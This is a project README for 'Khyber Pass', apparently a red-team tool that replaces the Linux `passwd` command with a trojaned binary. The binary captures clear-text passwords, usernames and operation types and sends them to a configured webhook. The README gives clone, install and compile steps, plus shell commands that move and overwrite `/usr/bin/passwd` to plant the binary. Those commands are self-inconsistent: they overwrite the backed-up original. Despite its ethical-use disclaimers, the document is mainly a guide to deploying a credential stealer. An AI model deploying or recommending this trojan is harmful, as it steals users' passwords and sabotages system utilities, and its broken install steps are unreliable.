# Khyber Pass 🔓💻

## Overview

**Khyber Pass** is a penetration testing tool designed for red teamers to capture clear-text passwords whenever a user attempts to change them. The tool works by intercepting password inputs during a `passwd` operation and sending the captured data (username, operation, and password) to a specified webhook. It is intended solely for ethical use in penetration testing scenarios, such as during authorized red team engagements or ethical hacking competitions, with explicit permission from both sides. This tool is licensed under the MIT license.

## Prerequisites

Before using Khyber Pass, ensure you have the following requirements:

- **libcurl** (for interacting with webhooks)
- **C Compiler** (such as GCC or Clang)
- **curl**

All of the requirements should be automatically installed by running `./install.sh`

## Getting Started

### 1. Clone the Repository

If you haven't already, clone the repository:

```bash
git clone https://github.com/Dark-Avenger-Reborn/Khyber-Pass.git
cd Khyber-Pass
```

### 2. Install Dependencies

To install the required dependencies for Khyber Pass, run the `install.sh` script:

```bash
./install.sh
```

This script will install the necessary system packages (such as `libcurl` and `curl`) depending on your system's package manager. It will **not** compile the binary. For compilation, refer to the next step.

### 3. Compile the Binary


```bash
./compile.sh
```

This script will compile the `evil_passwd.c` C file and output a binary named `evil_passwd` in the current directory. This binary is used to replace the original `passwd` command to capture passwords during password changes.

### 4. Installing the Binary (Optional)

Once compiled, you can move and install the binary to the system. To do this manually, follow these steps:

```bash
mv /usr/bin/passwd /usr/bin/.passwd
cp ./evil_passwd /usr/bin/.passwd
```

This step will replace the system’s `passwd` command with your newly compiled version. If you'd like to retain the original `passwd` binary, consider renaming the new binary or using it in a controlled environment.

### 5. Configure the Webhook URL

During the execution of the `./compile.sh` binary, you will be prompted to enter a webhook URL. This URL is where the captured password data will be sent. Make sure the URL is correct and configured to receive the webhook data.

## Usage

- The Khyber Pass tool intercepts password changes by overriding the system `passwd` command. It captures the plaintext password, the operation type (e.g., lock, unlock, change), and the username.
- The captured data is sent to the specified webhook URL in JSON format for further analysis.
- Use the tool only for ethical testing with proper authorization from all parties involved. Unauthorized use of this tool can lead to legal consequences.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
